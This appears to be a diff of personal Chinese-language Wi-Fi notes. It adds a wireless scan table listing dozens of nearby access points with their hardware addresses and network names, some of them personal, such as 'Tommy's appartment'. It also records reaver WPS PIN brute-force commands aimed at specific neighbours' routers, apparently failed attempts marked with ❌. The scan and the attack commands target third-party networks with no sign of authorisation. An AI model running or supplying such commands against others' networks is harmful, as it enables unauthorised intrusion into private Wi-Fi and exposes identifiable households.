@@ -513,6 +513,22 @@ wps locked 下是no  ➜  wps 没有被关闭.  ➜ 也就是说wps是开启的.
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 reaver -i wlan0mon -b A8:57:4E:A7:47:2C -vv
 
 7C:08:D9:DB:2C:CA   1  00  1.0  No   ChinaNGB-602
@@ -577,7 +593,6 @@ F0:B4:29:E6:A7:FE   8  00  1.0  No   Xiaomi_1902
 7C:08:D9:E7:17:D1   1  00  1.0  No   ChinaNGB-321
 68:9F:F0:5A:98:F5   8  00  1.0  No   ChinaNet-X3ey
 BC:D1:77:29:EC:A0   1  00  1.0  No   Wu LieJian
-18:44:E6:73:CA:CF   1  00  1.0  No   ChinaNet-VTka      ❌ ❌
 F4:B8:A7:6C:34:BC   6  00  1.0  No   ChinaNet-TA5N
 F4:B8:A7:68:2C:B0   8  00  1.0  No   ChinaNet-aSsQ
 08:10:7A:28:99:0E  11  00  1.0  No   ChinaNet-2.4G-990E
@@ -593,6 +608,115 @@ F4:EE:14:00:93:DC  11  00  1.0  No   MERCURY
 E0:28:61:C3:59:AC   5  00  1.0  No   ChinaNet-wqD6
 8C:BE:BE:26:A7:D1  10  00  1.0  No   Xiaomi_A7D0
 D4:67:E7:0C:AC:B1   1  00  1.0  No   ChinaNet-a9MG
+
+
+
+
+
+
+
+
+
+
+BSSID              Ch  dBm  WPS  Lck  ESSID
+--------------------------------------------------------------------------------
+E4:D3:32:B4:83:BC   9  -81  1.0  No   MERCURY_210
+98:BC:57:5B:A5:7E  13  -73  1.0  No   ChinaNGB-Yd7TU2
+18:44:E6:73:CA:CF   1  -75  1.0  No   ChinaNet-VTka          reaver -i wlan0mon -b 18:44:E6:73:CA:CF -vv  ❌
+98:BC:57:6C:C1:B3   1  -77  1.0  No   ChinaNGB-YdXfJX
+DC:2A:14:1A:00:F2   3  -71  1.0  No   ChinaNGB-onshine
+14:75:90:08:4D:5E   6  -67  1.0  No   lys                     reaver -i wlan0mon -b 14:75:90:08:4D:5E -vv  ❌
+68:9F:F0:5A:98:F5   8  -57  1.0  No   ChinaNet-X3ey
+5C:63:BF:FE:8A:B8   8  -57  1.0  No   ChinaNet-8AB8
+B8:08:D7:51:A4:48   8  -59  1.0  No   HUAWEI  403
+FC:19:D0:3E:07:67   8  -67  1.0  No   ChinaNGB-Ljf9hf
+D0:60:8C:42:F6:9A  10  -45  1.0  No   ChinaNet-3KXp
+54:BE:53:5A:B9:47  11  -65  1.0  No   ChinaNet-6xkb
+E0:28:61:81:FA:20  11  -45  1.0  No   ChinaNet-UXjM
+F0:B4:29:21:07:A5  11  -65  1.0  No   G-family
+D4:61:2E:BE:61:33  11  -65  1.0  No   HUAWEI-KTNNYX
+78:A1:06:F4:F0:CE  11  -61  1.0  No   TP-LINK_F4F0CE
+78:C1:A7:0B:88:4E  11  -59  1.0  No   ZTE-2.4G-0B884E
+F4:EE:14:00:93:DC  11  -57  1.0  No   MERCURY
+28:6C:07:43:98:8C   1  -59  1.0  No   Tommy's appartment
+08:10:7A:1D:9E:A7   1  -63  1.0  No   ChinaNet-2.4G-Home  HuA
+98:BC:57:5D:30:5A   1  -63  1.0  No   ChinaNGB-YdPmCF
+FC:19:D0:4C:0E:6A   3  -55  1.0  No   ChinaNGB-1607
+B8:08:D7:76:FF:88   5  -57  1.0  No   HW_001
+20:DC:E6:EF:C5:76   6  -61  1.0  No   TP-LINK_EFC576
+60:BB:0C:DB:33:ED   6  -53  1.0  No   ChinaNet-2XSV
+BC:D1:77:B3:11:C0   6  -61  1.0  No   TP-LINK_B311C0
+8C:21:0A:90:08:AC   6  -59  1.0  No   MERCURY_9008AC
+20:DC:E6:41:2A:F4   6  -55  1.0  No   philips
+A8:57:4E:A7:47:2C  11  -59  1.0  No   UU
+2A:6C:07:D9:6B:F1  13  -65  1.0  No   Xiaomi_6BF0_VIP
+D0:60:8C:41:B0:EA   3  -61  1.0  No   ChinaNet-m77z
+84:C9:B2:87:AC:8A   6  -63  1.0  No   dlink
+EC:88:8F:54:66:60   6  -63  1.0  No   wqs12
+EC:88:8F:BB:99:BC   6  -59  1.0  No   FAST_BB99BC
+D4:A1:48:92:30:C4   6  -57  1.0  No   appleshi_2.4G
+98:BC:57:5F:83:5B  12  -63  1.0  No   ChinaNGB-Ydm93P
+98:BC:57:5B:A5:FF  12  -57  1.0  No   ChinaNGB-YdxPch
+7C:08:D9:DB:2C:CA   1  -57  1.0  No   ChinaNGB-602
+98:F4:28:02:1C:37   1  -57  1.0  No   ChinaNet-NMZp
+38:83:45:FD:82:12   1  -63  1.0  No   tingting
+98:BC:57:70:62:A9  13  -63  1.0  No   ChinaNGB-YdM7rV
+98:BC:57:4E:C4:6E   1  -61  1.0  No   ChinaNGB-YDVa2n
+08:C0:21:2E:AE:D4   1  -63  1.0  No   CMCC-i6Eb
+C4:C7:55:3D:65:5E   1  -61  1.0  No   ChinaNet-pDQn
+7C:08:D9:B2:8E:92   1  -69  1.0  No   ChinaNGB-239309
+08:10:7A:28:2E:F6   1  -63  1.0  No   ChinaNet-2.4G-2EF6
+C4:C7:55:0F:85:31  11  -63  1.0  No   ChinaNet-9d2f
+D4:76:EA:89:F1:CF   2  -59  1.0  No   ChinaNet-EsuN
+A8:15:4D:FD:2F:10   6  -65  1.0  No   tang_1003
+C8:E7:D8:37:B4:08   1  -65  1.0  No   ADMIN-2401
+F0:B4:29:D1:69:C3   3  -65  1.0  No   5G就是它
+08:3F:BC:BC:07:EF   5  -61  1.0  No   ChinaNet-cVjp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -866,7 +990,6 @@ D4:67:E7:0C:AC:B1   1  00  1.0  No   ChinaNet-a9MG
     🔵 中继路由器.
         主要设置都在中继路由器上进行. 主路由器什么都不用设置!只要指定信道就可以了!!!
         👁‍🗨 恢复出厂设置: 管理 ➜ 出厂预设值 ➜ 恢复出厂设置
-
 
     🔸 更改登录帐号密码 (可选)
     🔸 设置中文界面     (可选)
